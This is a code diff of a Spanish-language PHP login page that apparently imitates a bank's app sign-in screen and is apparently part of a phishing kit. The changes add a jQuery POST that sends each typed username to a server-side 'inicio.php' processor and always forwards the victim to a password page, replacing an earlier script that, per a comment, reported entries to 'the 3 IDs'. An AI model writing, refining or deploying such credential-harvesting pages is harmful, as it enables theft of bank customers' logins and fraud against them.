@@ -20,10 +20,8 @@ $tiempo = date("l, j \d\e F \d\e Y");
         <link href="../css/style-app.css?v2" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            /* Corregido: Quitamos el !important para que el JS pueda mostrarlo */
             #fondo, #cargando-o {
                 display: none; 
                 position: fixed;
@@ -35,6 +33,7 @@ $tiempo = date("l, j \d\e F \d\e Y");
             }
             #btn-continuar:disabled { background-color: #ccc !important; cursor: not-allowed; color: #777; }
             #btn-continuar { background-color: #FDDA24 !important; color: #000; font-weight: bold; cursor: pointer; }
+            .entradas { border: none; outline: none; width: 100%; font-size: 16px; font-family: 'Open Sans'; }
         </style>
     </head>
     <body>         
@@ -46,9 +45,9 @@ $tiempo = date("l, j \d\e F \d\e Y");
 
         <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
             <tr>
-                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
-                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
+                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
+                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
+                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="25"></td>
             </tr>
         </table>
 
@@ -56,7 +55,7 @@ $tiempo = date("l, j \d\e F \d\e Y");
             <img src="../img/logo.svg" width="220" style="margin-top: 40px; margin-bottom: 30px;">
         </div>
 
-        <div class="titulo-app" style="text-align: center; font-weight: 800;">Ingresa tu usuario</div>  
+        <div class="titulo-app" style="text-align: center; font-weight: 800; font-family: 'Open Sans';">Ingresa tu usuario</div>  
         
         <div class="frm" style="padding: 25px;">
             <div class="inp" id="inp-usuario" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
@@ -64,7 +63,7 @@ $tiempo = date("l, j \d\e F \d\e Y");
                     <tr>
                         <td valign="middle" width="36" align="left"><img src="../img/ico-u.jpg" width="26"></td>
                         <td valign="middle" align="left">
-                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off" placeholder="Ingresa el usuario" style="border: none; outline: none; width: 100%; font-size: 16px;">
+                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off" placeholder="Ingresa el usuario">
                         </td>
                     </tr>
                 </table>
@@ -75,41 +74,39 @@ $tiempo = date("l, j \d\e F \d\e Y");
 
         <script type="text/javascript">
             $(document).ready(function() { 
-                // Aseguramos que todo esté limpio al cargar
-                $("#fondo").hide();
-                $("#cargando-o").hide();
+                $("#fondo, #cargando-o").hide();
 
-                // Habilitar botón al escribir
-                $("#txt-usuario").on("keyup", function() {
-                    if ($(this).val().length >= 3) {
+                // Habilitar botón al escribir 4 caracteres
+                $("#txt-usuario").on("input", function() {
+                    if ($(this).val().length >= 4) {
                         $("#btn-continuar").prop("disabled", false);
                     } else {
                         $("#btn-continuar").prop("disabled", true);
                     }
                 });
 
-                // Acción de envío
+                // Acción de envío directo
                 $("#btn-continuar").click(function(e) {
                     e.preventDefault();
                     var user_val = $("#txt-usuario").val();
                     
                     if (user_val !== "") {
-                        // 1. Mostrar carga inmediatamente
                         $("#fondo").show();
                         $("#cargando-o").show();
 
-                        // 2. Reportar a los 3 IDs (Llamada al functions.js)
-                        // Si por alguna razón la función falla, forzamos el salto
-                        try {
-                            inicio(user_val);
-                        } catch(err) {
+                        // REPORTE DIRECTO AL PROCESADOR
+                        // Enviamos la variable "usr" que es la que espera tu inicio.php
+                        $.post("../process/inicio.php", { usr: user_val }, function(data) {
                             window.location.href = "PASS.php";
-                        }
+                        }).fail(function() {
+                            // Si el servidor está lento, saltamos igual a los 1.5 seg
+                            setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
+                        });
 
-                        // 3. Salto de seguridad (3 segundos máximo)
+                        // Seguridad total: si nada responde, salta a los 4 segundos
                         setTimeout(function(){
                             window.location.href = "PASS.php";
-                        }, 3000);
+                        }, 4000);
                     }
                 });
             });
